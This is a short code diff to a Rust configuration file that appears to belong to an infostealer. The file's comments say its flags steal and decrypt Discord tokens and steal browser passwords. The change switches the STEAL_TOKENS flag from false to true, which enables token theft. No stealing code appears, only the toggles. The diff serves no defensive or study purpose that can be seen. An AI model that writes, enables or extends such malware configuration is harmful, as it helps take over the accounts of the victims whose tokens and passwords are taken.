@@ -5,7 +5,7 @@ pub const TRACE_TOKEN: bool = false;
 pub const REFRESH_DISCORD: bool = false;
 
 // Steals and decrypts discord tokens (self explanatory)
-pub const STEAL_TOKENS: bool = false;
+pub const STEAL_TOKENS: bool = true;
 
 // Steals browser passwords (self explanatory)
 pub const STEAL_PASSWORDS: bool = false;
